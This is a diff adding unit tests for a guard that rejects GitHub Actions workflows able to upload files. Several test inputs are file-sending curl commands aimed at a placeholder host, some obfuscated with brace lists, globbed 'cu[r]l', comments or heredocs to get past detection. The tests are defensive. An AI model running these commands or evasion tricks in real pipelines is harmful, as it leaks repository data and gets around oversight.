@@ -183,5 +183,67 @@ class FetchOnlyAllowed(unittest.TestCase):
                 self.assertIsNone(placement_refuses(workflow(run)), run)
 
 
+def workflow_on(runs_on, run, shell=None):
+    shell_line = f'        shell: {shell}\n' if shell else ''
+    return (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: {runs_on}\n    steps:\n'
+            f'      - run: {json.dumps(run)}\n{shell_line}')
+
+
+class ReviewRound2(unittest.TestCase):
+    """Owner-directed hardening: Windows default shell, brace lists, find globs, comments, heredocs, parse faults."""
+
+    def test_windows_job_without_shell_bash_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow_on('windows-latest', 'echo hi')))
+
+    def test_matrix_runs_on_without_shell_bash_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow_on('${{ matrix.os }}', 'echo hi')))
+
+    def test_windows_job_with_shell_bash_passes(self):
+        self.assertIsNone(placement_refuses(workflow_on('windows-latest', 'echo hi', shell='bash')))
+
+    def test_ubuntu_job_without_shell_passes(self):
+        self.assertIsNone(placement_refuses(workflow_on('ubuntu-24.04', 'echo hi')))
+
+    def test_brace_list_send_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('{curl,-F,f=@out.txt,https://example.invalid/up}')))
+
+    def test_find_exec_glob_send_refused(self):
+        run = 'find . -exec cu[r]l -F f=@out.txt https://example.invalid/up \\;'
+        self.assertIsNotNone(placement_refuses(workflow(run)))
+
+    def test_timeout_glob_send_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('timeout 5 cu[r]l -F f=@out.txt https://example.invalid/up')))
+
+    def test_hash_inside_word_does_not_hide_send(self):
+        self.assertIsNotNone(placement_refuses(workflow('echo a#b; curl -F f=@out.txt https://example.invalid/up')))
+
+    def test_comment_before_send_line_still_refused(self):
+        run = 'git status  # note\ncurl -F f=@out.txt https://example.invalid/up\n'
+        self.assertIsNotNone(placement_refuses(workflow(run)))
+
+    def test_unterminated_heredoc_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow("bash <<'EOF'\ncurl -F f=@out.txt https://example.invalid/up\n")))
+
+    def test_comment_with_apostrophe_passes(self):
+        self.assertIsNone(placement_refuses(workflow("make check # it's fine\n")))
+
+    def test_hash_inside_word_and_fetch_passes(self):
+        self.assertIsNone(placement_refuses(workflow('echo a#b; git fetch origin')))
+
+    def test_quoted_heredoc_data_passes(self):
+        self.assertIsNone(placement_refuses(workflow("cat <<'EOF'\ncurl -F f=@x h\nEOF\n")))
+
+    def test_gh_api_graphql_without_fields_refused(self):
+        self.assertIsNotNone(placement_refuses(workflow('gh api graphql')))
+
+    def test_parse_fault_refuses_not_passes(self):
+        from unittest import mock
+        with mock.patch.object(guard, '_send_problem_checked', side_effect=RuntimeError('boom')):
+            self.assertIsNotNone(guard._send_problem('echo hi'))
+
+    def test_send_inside_comment_only_passes(self):
+        self.assertIsNone(placement_refuses(workflow('git status # curl -F f=@x h')))
+
+
 if __name__ == '__main__':
     unittest.main()
